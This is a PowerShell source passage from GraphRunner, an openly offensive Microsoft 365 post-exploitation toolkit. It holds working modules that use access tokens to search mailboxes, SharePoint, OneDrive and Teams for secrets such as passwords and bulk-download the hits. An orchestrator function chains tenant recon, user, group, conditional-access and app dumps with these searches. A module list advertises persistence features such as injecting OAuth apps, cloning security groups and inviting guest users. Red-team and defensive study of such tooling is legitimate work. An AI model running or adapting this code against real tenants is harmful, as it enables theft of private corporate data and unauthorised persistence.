                # Save email details as a .msg file
                $messageDetails | ConvertTo-Json | Out-File -FilePath "$folderName\$filename" -Encoding UTF8

                # Fetch and save attachments
                if ($messageDetails.hasAttachments -like "True") {
                        Write-Host ("[**] " + $messageDetails.subject + " has attachments.")
                        $attachmentDetails = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages/$itemId/attachments" -Headers $headers -Method Get

                        foreach($item in $attachmentDetails.value){
                        $attachmentContentBytes = [System.Convert]::FromBase64String($item.contentBytes)
                        $attachmentFileName = ($CleanedSubject + "-attached-" + $item.name)
                        Write-Host "[***] Downloading attachment $attachmentFileName"
                        $attachmentContentBytes | Set-Content -Path "$folderName\$attachmentFileName" -Encoding Byte
                        }
        
                }
                }
                # Export the email file names to filelist.json
                $emailFileNames | ConvertTo-Json | Out-File -FilePath "$folderName\filelist.json" -Encoding UTF8
                $htmlContent = @"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Viewer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f7f7f7;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .app-container {
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            max-width: 1200px;
        }
        .email-summary {
            cursor: pointer;
            margin: 10px;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            transition: background-color 0.2s;
        }
        .email-summary:hover {
            background-color: #f7f7f7;
        }
        .email-summary strong {
            color: #333;
        }
        .email-content {
            max-height: 500px; /* Set the maximum height for the scrollable container */
            overflow: auto; /* Enable scrolling if content exceeds the maximum height */
            border: 1px solid #ccc;
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="app-container">
        <h1>GraphRunner Email Viewer</h1>
        <div id="emailList"></div>
        <div id="emailContainer" class="email-content"></div>
    </div>

    <script>
        const emailList = document.getElementById('emailList');
        const emailContainer = document.getElementById('emailContainer');

        fetchEmailList();

        async function fetchEmailList() {
            try {
                const response = await fetch('filelist.json');
                const fileListContent = await response.text();
                const fileList = JSON.parse(fileListContent);

                fileList.forEach(async (file) => {
                    const response = await fetch(file);
                    const email = await response.json();

                    const emailSummaryDiv = document.createElement('div');
                    emailSummaryDiv.classList.add('email-summary');
                    emailSummaryDiv.innerHTML = ``
                        <strong>Subject:</strong> `${email.subject}<br>
                        <strong>Sender:</strong> `${email.sender.emailAddress.name}<br>
                        <strong>From:</strong> `${email.from.emailAddress.name} (`${email.from.emailAddress.address})<br>
                        <strong>Preview:</strong> `${email.bodyPreview}<br>
                        <strong>Attachments:</strong> `${email.hasAttachments ? 'Yes' : 'No'}<br>
                    ``;
                    
                    emailSummaryDiv.addEventListener('click', () => loadFullEmail(email));
                    emailList.appendChild(emailSummaryDiv);
                });
            } catch (error) {
                console.error('Error fetching file list:', error);
            }
        }

        function loadFullEmail(email) {
            emailContainer.innerHTML = email.body.content;
        }
    </script>
</body>
</html>
"@
        
            $htmlContent | Out-File -FilePath "$folderName\emailviewer.html" -Encoding UTF8
            Write-Host -ForegroundColor yellow "[*] Emails and attachments have been exported to the folder $folderName."
            Write-Host -ForegroundColor yellow "[*] A simple emailviewer.html has been provided to view the exported emails."
            Write-Host -ForegroundColor yellow "[*] To use it run the Invoke-HTTPServer module in the $folderName directory and then navigate to http://localhost:8000/emailviewer.html"
        }
        }
        
        
        If(!$PageResults){
            $moreresults = "False"
        }
        if ($PageResults -and ($moreresults -like "True")) {
            $searchQuery.requests[0].from += $MessageCount
            $searchQueryJson = $searchQuery | ConvertTo-Json -Depth 10
            $response = Invoke-RestMethod -Uri $graphApiUrl -Headers $headers -Method Post -Body $searchQueryJson
        }
    }
        
}



function Invoke-HTTPServer{
    <#
    .SYNOPSIS 
    A basic web server to use for accessing the emailviewer.html file output from Invoke-SearchMailbox
    #>
    param(
        [Parameter(Position = 0, Mandatory = $false)]
        [object[]]
        $port = "8000"
    )

    $listener = New-Object System.Net.HttpListener
    $listener.Prefixes.Add("http://localhost:$port/")
    $listener.Start()

    Write-Host "Listening for requests on http://localhost:$port/"

    while ($listener.IsListening) {
         $context = $listener.GetContext()
         $response = $context.Response

         $filename = $context.Request.Url.LocalPath.TrimStart('/')
         $content = Get-Content -Path $filename -Raw

         $buffer = [System.Text.Encoding]::UTF8.GetBytes($content)
         $response.ContentLength64 = $buffer.Length
         $response.OutputStream.Write($buffer, 0, $buffer.Length)
         $response.OutputStream.Close()
    }

}


function Invoke-SearchSharePointAndOneDrive{
    <#
    .SYNOPSIS

        This module uses the Graph search API to search for specific terms in all SharePoint and OneDrive drives available to the logged in user. It prompts the user which files they want to download.   
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       This module uses the Graph search API to search for specific terms in all SharePoint and OneDrive drives available to the logged in user. It prompts the user which files they want to download.

    .PARAMETER Tokens

        Pass the $tokens global variable after authenticating to this parameter

    .PARAMETER SearchTerm

         The term you want to search for. This accepts KQL queries so you can use terms like "filetype", "content", and more.

    .PARAMETER ResultCount

        The amount of files returned in the search results (default = 25)

    .PARAMETER OutFile

        File to output a list of hits to

    .PARAMETER PageResults

        Using paging it will return all possible results for a search term

    .EXAMPLE
        
        C:\PS> Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password filetype:xlsx'
        -----------
        This will search through the all SharePoint and OneDrive drives accessible to the current user for the term password.
    #>
    param(
    [Parameter(Position = 0, Mandatory = $false)]
    [object[]]
    $Tokens = "",
    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $SearchTerm = "",
    [Parameter(Position = 2, Mandatory = $false)]
    [string]
    $ResultCount = "25",
    [Parameter(Position = 3, Mandatory = $false)]
    [string]
    $DetectorName = "Custom",
    [Parameter(Position = 4, Mandatory = $false)]
    [string]
    $OutFile = "",
    [switch]
    $ReportOnly,
    [switch]
    $PageResults,
    [switch]
    $GraphRun
    )

    if($Tokens){
        #Suppressing output if GraphRun module is used
        if (!$GraphRun){
            Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
        }
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $access_token = $tokens.access_token   
    [string]$refresh_token = $tokens.refresh_token 

    $graphApiUrl = "https://graph.microsoft.com/v1.0/search/query"

    # Define the headers with the access token and content type
    $headers = @{
    "Authorization" = "Bearer $access_token"
    "Content-Type" = "application/json"
    }

    # Define the search query
    $searchQuery = @{ requests = @( @{
        entityTypes = @("driveItem")
        query = @{
            queryString = $SearchTerm
        }
        from = 0
        size = $ResultCount
        }
    )
    }

    # Convert the search query to JSON format
    $searchQueryJson = $searchQuery | ConvertTo-Json -Depth 10

    # Perform the HTTP POST request to search emails
    $response = Invoke-RestMethod -Uri $graphApiUrl -Headers $headers -Method Post -Body $searchQueryJson


    $resultarray = @()
    $total = $response.value[0].hitsContainers[0].total
    if(!$GraphRun){
        Write-Host -ForegroundColor yellow "[*] Found $total matches for search term $searchTerm"
    }
    else{
        if([int]$total -gt 0){
            Write-Host -ForegroundColor yellow "[*] Found $total matches for detector: $DetectorName"
        }
    }
    if ([int]$total -gt 0){
        $itemnumber = 0
       
        while ($itemnumber -lt $total) {
            $resultsList = @()
            foreach ($hit in $response.value[0].hitsContainers[0].hits) {
            $filename = $hit.resource.name
            $CreatedDate = $hit.resource.fileSystemInfo.createdDateTime
            $LastModifiedDate = $hit.resource.lastModifiedDateTime
            $sizeInBytes = $hit.resource.size
                if ($sizeInBytes -lt 1024) {
                    $sizeFormatted = "{0:N0} Bytes" -f $sizeInBytes
                } elseif ($sizeInBytes -lt 1048576) {
                    $sizeFormatted = "{0:N2} KB" -f ($sizeInBytes / 1024)
                } elseif ($sizeInBytes -lt 1073741824) {
                    $sizeFormatted = "{0:N2} MB" -f ($sizeInBytes / 1048576)
                } else {
                    $sizeFormatted = "{0:N2} GB" -f ($sizeInBytes / 1073741824)
                }
            $summary = $hit.summary
            $location = $hit.resource.webUrl
            $driveid = $hit.resource.parentReference.driveId
            $itemid = $hit.resource.id

            $resultInfo = @{
                result = $itemnumber
                filename = $filename
                driveitemids = ($driveid + ":" + $itemid)
            }
            $LogInfo = @{
                "Detector Name" = $DetectorName
                "File Name" = $filename
                "Size" = $sizeFormatted
                "Location" = $location
                "DriveItemID" = ($driveid + ":" + $itemid)
                "Preview" = $summary
            }
            
            $resultarray += New-Object PSObject -Property $resultInfo
            $resultsList += New-Object PSObject -Property $LogInfo
            if(!$ReportOnly){
                Write-Host "Result [$itemnumber]"
                Write-Host "File Name: $filename"
                Write-Host "Location: $location"
                Write-Host "Created Date: $CreatedDate"
                Write-Host "Last Modified Date: $LastModifiedDate"
                Write-Host "Size: $sizeFormatted"
                Write-Host "File Preview: $summary"
                Write-Host "DriveID & Item ID: $driveid\:$itemid"
                Write-Host ("=" * 80) 
                }
            $itemnumber++
            }
            if($OutFile){
                if(!$GraphRun){
                    Write-Host -ForegroundColor yellow "[*] Writing results to $OutFile"
                }
                $resultsList | Export-Csv -Path $OutFile -NoTypeInformation -Append
            }
            if ($itemnumber -lt $total -and $PageResults) {
                $searchQuery.requests[0].from += $ResultCount
                $searchQueryJson = $searchQuery | ConvertTo-Json -Depth 10
                $response = Invoke-RestMethod -Uri $graphApiUrl -Headers $headers -Method Post -Body $searchQueryJson
            }
            If(!$PageResults){
                $itemnumber = $total
            }
        }
        if(!$ReportOnly){
        $done = $false

        while ($done -ne $true) {
            if ($done -eq "yes") {
                Write-Host -ForegroundColor Cyan "[*] Do you want to download any more files? (Yes/No)"
                $anotherDownload = Read-Host
                $anotherDownload = $anotherDownload.ToLower()

                if ($anotherDownload -eq "yes" -or $anotherDownload -eq "y") {
                    Write-Host -ForegroundColor Cyan '[*] Enter the result number(s) of the file(s) that you want to download. Ex. "0,10,24"'
                    $resulttodownload = Read-Host
                    $resultstodl = $resulttodownload.split(",")
                    foreach ($res in $resultstodl){
                        $specificfileinfo = $resultarray[$res]
                        Invoke-DriveFileDownload -Tokens $tokens -DriveItemIDs $specificfileinfo.driveitemids -FileName $specificfileinfo.filename
                    }
                } elseif ($anotherDownload -eq "no" -or $anotherDownload -eq "n") {
                    Write-Output "[*] Quitting..."
                    $done = $true
                    break
                } else {
                    Write-Output "Invalid input. Please enter Yes or No."
                }
            } else {
                Write-Host -ForegroundColor Cyan "[*] Do you want to download any of these files? (Yes/No)"
                $answer = Read-Host
                $answer = $answer.ToLower()

                if ($answer -eq "yes" -or $answer -eq "y") {
                    $done = "yes"  
                    Write-Host -ForegroundColor Cyan '[*] Enter the result number(s) of the file(s) that you want to download. Ex. "0,10,24"'
                    $resulttodownload = Read-Host
                    $resultstodl = $resulttodownload.split(",")
                    foreach ($res in $resultstodl){
                        $specificfileinfo = $resultarray[$res]
                        Invoke-DriveFileDownload -Tokens $tokens -DriveItemIDs $specificfileinfo.driveitemids -FileName $specificfileinfo.filename
                    }
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Output "[*] Quitting..."
                    $done = $true
                    break
                } else {
                    Write-Output "Invalid input. Please enter Yes or No."
                }
            }
        }
        }    
    }
}

function Invoke-DriveFileDownload{
    <#
        .SYNOPSIS

        If you want to download individual files from SharePoint and OneDrive you can use the DriveID & ItemID output with the Invoke-SearchSharePointAndOneDrive module.   
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
        If you want to download individual files from SharePoint and OneDrive you can use the DriveID & ItemID output with the Invoke-SearchSharePointAndOneDrive module.

    .PARAMETER Tokens

        Pass the $tokens global variable after authenticating to this parameter

    .PARAMETER DriveItemIDs

        A combined value of the drive ID and item ID separated by a colon like this: "b!wDDN4DNGFFufSAEEN8TO3FEfeD9gdE3fm2O_-kGSapywefT_je-ghthhilmtycsZ\:01AVEVEP23EJ43DPEVEGEF7IZ6YEFEF222"

    .PARAMETER FileName

        The filename you want to download the file to

    .EXAMPLE
        
        C:\PS> Invoke-DriveFileDownload -Tokens $tokens -FileName "Passwords.docx" -DriveItemIDs "b!wDDN4DNGFFufSAEEN8TO3FEfeD9gdE3fm2O_-kGSapywefT_je-ghthhilmtycsZ\:01AVEVEP23EJ43DPEVEGEF7IZ6YEFEF222"
        -----------
        This will download a single file from the drive specified.
    #>
    param(
    [Parameter(Position = 0, Mandatory = $false)]
    [object[]]
    $Tokens = "",
    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $DriveItemIDs = "",
    [Parameter(Position = 2, Mandatory = $true)]
    [string]
    $FileName = ""
    )
    $access_token = $tokens.access_token
    $itemarray = $driveitemids.split(":")
    $downloadUrl = ("https://graph.microsoft.com/v1.0/drives/" + $itemarray[0] + "/items/" + $itemarray[1] + "/content")
    $downloadheaders = @{
    "Authorization" = "Bearer $access_token"
    }
    Write-Host -ForegroundColor yellow "[*] Now downloading $FileName"
    Invoke-RestMethod -Uri $downloadUrl -Headers $downloadheaders -OutFile $filename
}


function Invoke-SearchTeams{
    <#
        .SYNOPSIS

        This module uses the Substrate search API to search for specific terms in Teams channels visible to the logged in user.   
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
        This module uses the Substrate search API to search for specific terms in Teams channels visible to the logged in user.

    .PARAMETER Tokens

        Pass the $tokens global variable after authenticating to this parameter

    .PARAMETER SearchTerm

        The term you want to search for in Teams messages

    .PARAMETER ResultSize

        The amount of messages returned in the search results (default = 50)

    .PARAMETER OutFile

        File to output the results of the search to

    .EXAMPLE
        
        C:\PS> Invoke-SearchTeams -Tokens $tokens -SearchTerm "password" -ResultSize 100
        -----------
        This searches all Teams messages in all channels visible to the current user for the term password.
    #>
    param(
    [Parameter(Position = 0, Mandatory = $false)]
    [object[]]
    $Tokens = "",
    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $SearchTerm = "",
    [Parameter(Position = 2, Mandatory = $false)]
    [string]
    $ResultSize = "50",
    [Parameter(Position = 3, Mandatory = $false)]
    [string]
    $DetectorName = "Custom",
    [Parameter(Position = 4, Mandatory = $false)]
    [string]
    $OutFile = "",
    [switch]
    $GraphRun
    )

    if($Tokens){
        #Suppressing output if GraphRun module is used
        if (!$GraphRun){
            Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
        }
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $accesstoken = $tokens.access_token   
    [string]$refreshtoken = $tokens.refresh_token 


    # First we need to refresh for Teams message access

    $scope = "https://outlook.office.com//.default openid profile offline_access"
    $grantType = "refresh_token"

    # Construct the request body
    $body = @{
        client_id     = $clientId
        scope         = $scope
        grant_type    = $grantType
        refresh_token = $refreshToken
        client_info   = 1
        "client-request-id" = (New-Guid).ToString()
    }
    if(!$GraphRun){
        Write-Host -ForegroundColor yellow "[*] Refreshing token for Teams use..."
    }

    # Send the POST request
    $response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantid/oauth2/v2.0/token" -Method Post -ContentType "application/x-www-form-urlencoded;charset=utf-8" -Body $body


    # We can search Teams messages with the Substrate Search API

    $access_token = $response.access_token
    $uri = "https://substrate.office.com/search/api/v2/query"
    $headers = @{
        "Authorization" = "Bearer $access_token"  
        "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69"
        "Content-Type" = "application/json"
    }

    # Define the request body
    $body = @{
        "EntityRequests" = @(
            @{
                "entityType" = "Message"
                "contentSources" = @("Teams")
                "fields" = @(
                    "Extension_SkypeSpaces_ConversationPost_Extension_FromSkypeInternalId_String",
                    "Extension_SkypeSpaces_ConversationPost_Extension_FileData_String",
                    "Extension_SkypeSpaces_ConversationPost_Extension_ThreadType_String",
                    "Extension_SkypeSpaces_ConversationPost_Extension_SkypeGroupId_String",
                    "Extension_SkypeSpaces_ConversationPost_Extension_SenderTenantId_String"
                )
                "propertySet" = "Optimized"
                "query" = @{
                    "queryString" = "$searchTerm AND NOT (isClientSoftDeleted:TRUE)"
                    "displayQueryString" = "$searchTerm"
                }
                "size" = $ResultSize
                "topResultsCount" = 9
            }
        )
        "QueryAlterationOptions" = @{
            "EnableAlteration" = $true
            "EnableSuggestion" = $true
            "SupportedRecourseDisplayTypes" = @("Suggestion", "ServiceSideRecourseLink")
        }
        "cvid" = (New-Guid).ToString()
        "logicalId" = (New-Guid).ToString()
        "scenario" = @{
            "Dimensions" = @(
                @{
                    "DimensionName" = "QueryType"
                    "DimensionValue" = "All"
                },
                @{
                    "DimensionName" = "FormFactor"
                    "DimensionValue" = "general.web.reactSearch"
                }
            )
            "Name" = "powerbar"
        }
        "WholePageRankingOptions" = @{
            "EntityResultTypeRankingOptions" = @(
                @{
                    "MaxEntitySetCount" = 1
                    "ResultType" = "Answer"
                }
            )
            "EnableEnrichedRanking" = $true
            "EnableLayoutHints" = $true
            "SupportedSerpRegions" = @("MainLine")
            "SupportedRankingVersion" = "V3"
        }
        "Context" = @{
            "EntityContext" = @(
                @{
                    "@odata.type" = "Microsoft.OutlookServices.Message"
                    "Id" = ""
                    "ClientThreadId" = ""
                }
            )
        }
    }

    # Convert the body to JSON
    $bodyJson = $body | ConvertTo-Json -Depth 10

    # Send the POST request
    $searchresponse = Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $bodyJson


    $headers = @{
        'Authorization' = "Bearer $accessToken"
    }

    # Loop through each message
    $resultsList = @()
    foreach ($result in $searchresponse.EntitySets.ResultSets.Results) {
        if ($result.Type -like "File"){
        $ResultID = $result.ID
        $Summary = $result.HitHighlightedSummary
        $Type = $result.Type
        $From = $result.Source.Author -join ";"
        }
        else{
        $ResultID = $result.ID
        $Summary = $result.Source.Preview
        $Type = $result.Type
        $From = $result.Source.From.EmailAddress.address
        $RestID = $result.Source.ItemRestId
        $DisplayTo = $result.Source.DisplayTo
        }

        if(!$GraphRun){
            Write-Host ("From: " + $From + " | Summary: " + $summary )
        }
        If($RestID){
            $graphApiUrl = "https://graph.microsoft.com/v1.0/me/messages/$RestID"

            $response = Invoke-RestMethod -Uri $graphApiUrl -Headers $headers -Method Get
            if(!$GraphRun){
                Write-Host ("Full Message Body: " + $response.body.content)
                Write-Host ("=" * 80)
            }
        }

        $LogInfo = @{
            "Detector Name" = $DetectorName
            "From" = $From
            "DisplayTo" = $DisplayTo
            "Summary" = $Summary
            "Body" = $response.body.content
        }
            
        $resultsList += New-Object PSObject -Property $LogInfo
    }
    if($OutFile){
        if(!$GraphRun){
            Write-Host -ForegroundColor yellow "[*] Writing results to $OutFile"
        }
        $resultsList | Export-Csv -Path $OutFile -NoTypeInformation -Append
    }
}


function Invoke-GraphRunner{
    <#
    .SYNOPSIS

        Runs Invoke-GraphRecon, Get-AzureADUsers, Get-SecurityGroups, Invoke-DumpCAPS, Invoke-DumpApps, and then uses the default_detectors.json file to search with Invoke-SearchMailbox, Invoke-SearchSharePointAndOneDrive, and Invoke-SearchTeams.  
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
        Runs Invoke-GraphRecon, Get-AzureADUsers, Get-SecurityGroups, Invoke-DumpCAPS, Invoke-DumpApps, and then uses the default_detectors.json file to search with Invoke-SearchMailbox, Invoke-SearchSharePointAndOneDrive, and Invoke-SearchTeams.

    .PARAMETER Tokens

        Pass the $tokens global variable after authenticating to this parameter

    .PARAMETER DetectorFile

        A json file containing KQL queries. See the default_detectors.json file in the repo as an example.

    .EXAMPLE
        
        C:\PS> Invoke-GraphRunner -Tokens $tokens
        -----------
        Runs through the account with many of the enumeration and pillage modules using the default_detectors.json file.
    #>

    param(
    [Parameter(Position = 0, Mandatory = $false)]
    [object[]]
    $Tokens = "",
    [Parameter(Position = 1, Mandatory = $false)]
    [string]
    $DetectorFile = ".\default_detectors.json",
    [switch]
    $DisableRecon,
    [switch]
    $DisableUsers,
    [switch]
    $DisableGroups,
    [switch]
    $DisableCAPS,
    [switch]
    $DisableApps,
    [switch]
    $DisableEmail,
    [switch]
    $DisableSharePoint,
    [switch]
    $DisableTeams
    )
    
    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $access_token = $tokens.access_token   
    [string]$refresh_token = $tokens.refresh_token 
    
    $detectors = Get-Content $DetectorFile
    $detector = $detectors |ConvertFrom-Json

    $folderName = "GraphRunner-" + (Get-Date -Format 'yyyyMMddHHmmss')
    New-Item -Path $folderName -ItemType Directory | Out-Null

    # GraphRecon
    if(!$DisableRecon){
        Write-Host -ForegroundColor yellow "[*] Now running Invoke-GraphRecon."
        Invoke-GraphRecon -Tokens $tokens -GraphRun | Out-File -Encoding ascii "$folderName\recon.txt"
    }

    # Users
    if(!$DisableUsers){
        Write-Host -ForegroundColor yellow "[*] Now getting all users"
        Get-AzureADUsers -Tokens $tokens -GraphRun -outfile "$folderName\users.txt"
    }

    # Groups
    if(!$DisableGroups){
        Write-Host -ForegroundColor yellow "[*] Now getting all groups"
        Get-SecurityGroups -AccessToken $tokens.access_token -GraphRun | Out-File -Encoding ascii "$folderName\groups.txt"
    }

    # CAPS
    if(!$DisableCAPS){
        Write-Host -ForegroundColor yellow "[*] Now getting conditional access policies"
        Invoke-DumpCAPS -Tokens $tokens -ResolveGuids -GraphRun | Out-File -Encoding ascii "$folderName\caps.txt"
    }

    # Apps
    if(!$DisableApps){
        Write-Host -ForegroundColor yellow "[*] Now getting applications"
        Invoke-DumpApps -Tokens $tokens -GraphRun | Out-File -Encoding ascii "$foldername\apps.txt"
    }

    # Email
    if(!$DisableEmail){
        $mailout = "$folderName\interesting-mail.csv"

        Write-Host -ForegroundColor yellow "[*] Now searching Email using detector file $DetectorFile. Results will be written to $folderName."
        foreach($detect in $detector.Detectors){
            Invoke-SearchMailbox -Tokens $tokens -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -MessageCount 500 -OutFile $mailout -GraphRun -PageResults
        }
    }
    
    # SharePoint and OneDrive Tests
    if(!$DisableSharePoint){
        $spout = "$folderName\interesting-files.csv"

        Write-Host -ForegroundColor yellow "[*] Now searching SharePoint and OneDrive using detector file $DetectorFile. Results will be written to $folderName."
        foreach($detect in $detector.Detectors){
            Invoke-SearchSharePointAndOneDrive  -Tokens $tokens -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -PageResults -ResultCount 500 -ReportOnly -OutFile $spout -GraphRun
        }
    }
    
    # Teams
    if(!$DisableTeams){
        $teamsout = "$folderName\interesting-teamsmessages.csv"
        Write-Host -ForegroundColor yellow "[*] Now searching Teams using detector file $DetectorFile. Results will be written to $folderName."
        foreach($detect in $detector.Detectors){
            Invoke-SearchTeams  -Tokens $tokens -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -ResultSize 500 -OutFile $teamsout -GraphRun
        }
    }

    Write-Host -ForegroundColor yellow "[*] Results have been written to $folderName"
}



function List-GraphRunnerModules{
    <#
    .SYNOPSIS 
    A module to list all of the GraphRunner modules
    #>

    Write-Host -foregroundcolor green "[*] Listing GraphRunner modules..."

    Write-Host -ForegroundColor green "-------------------- Authentication Modules -------------------"
    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
    Write-Host -ForegroundColor green "Get-GraphTokens`t`t`t-`t Authenticate as a user to Microsoft Graph
Invoke-RefreshGraphTokens`t-`t Use a refresh token to obtain new access tokens
Get-AzureAppTokens`t`t-`t Complete OAuth flow as an app to obtain access tokens
Invoke-RefreshAzureAppTokens`t-`t Use a refresh token and app credentials to refresh a token
Invoke-AutoOAuthFlow`t`t-`t Automates OAuth flow by standing up a web server and listening for auth code
Invoke-CheckAcces`t`t-`t Check if tokens are valid
    "
    Write-Host -ForegroundColor green "----------------- Recon & Enumeration Modules -----------------"
    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
    Write-Host -ForegroundColor green "Invoke-GraphRecon`t`t-`t Performs general recon for org info, user settings, directory sync settings, etc
Invoke-DumpCAPS`t`t`t-`t Gets conditional access policies
Invoke-DumpApps`t`t`t-`t Gets app registrations and external enterprise apps along with consent and scope info
Get-AzureADUsers`t`t-`t Gets user directory
Get-SecurityGroups`t`t-`t Gets security groups and members
Invoke-GraphOpenInboxFinder`t-`t Checks each user’s inbox in a list to see if they are readable
    "
    Write-Host -ForegroundColor green "--------------------- Persistence Modules ---------------------"
    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
    Write-Host -ForegroundColor green "Invoke-InjectOAuthApp`t`t-`t Injects an app registration into the tenant
Invoke-SecurityGroupCloner`t-`t Clones a security group while using an identical name and member list but can inject another user as well
Invoke-InviteGuest`t`t-`t Invites a guest user to the tenant
Invoke-DeleteOAuthApp`t`t-`t Delete an OAuth App
    "
    Write-Host -ForegroundColor green "----------------------- Pillage Modules -----------------------"
    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
    Write-Host -ForegroundColor green "Invoke-SearchSharePointAndOneDrive -`t Search across all SharePoint sites and OneDrive drives visible to the user
Invoke-SearchMailbox`t`t-`t Has the ability to do deep searches across a user’s mailbox and can export messages
Invoke-SearchTeams`t`t-`t Can search all Teams messages in all channels that are readable by the current user.
Invoke-SearchUserAttributes`t-`t Search for terms across all user attributes in a directory
Get-Inbox`t`t`t-`t Gets inbox items
Get-TeamsChat`t`t`t-`t Downloads full Teams chat conversations
    "
    Write-Host -ForegroundColor green "--------------------- GraphRunner Module ----------------------"
    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
    Write-Host -ForegroundColor green "Invoke-GraphRunner`t`t-`t Runs Invoke-GraphRecon, Get-AzureADUsers, Get-SecurityGroups, Invoke-DumpCAPS, Invoke-DumpApps, and then uses the default_detectors.json file to search with Invoke-SearchMailbox, Invoke-SearchSharePointAndOneDrive, and Invoke-SearchTeams."

    Write-Host -ForegroundColor green ("=" * 80)

    Write-Host -ForegroundColor green '[*] For help with individual modules run Get-Help <module name> -detailed'
    Write-Host -ForegroundColor green '[*] Example: Get-Help Invoke-InjectOAuthApp -detailed'

}
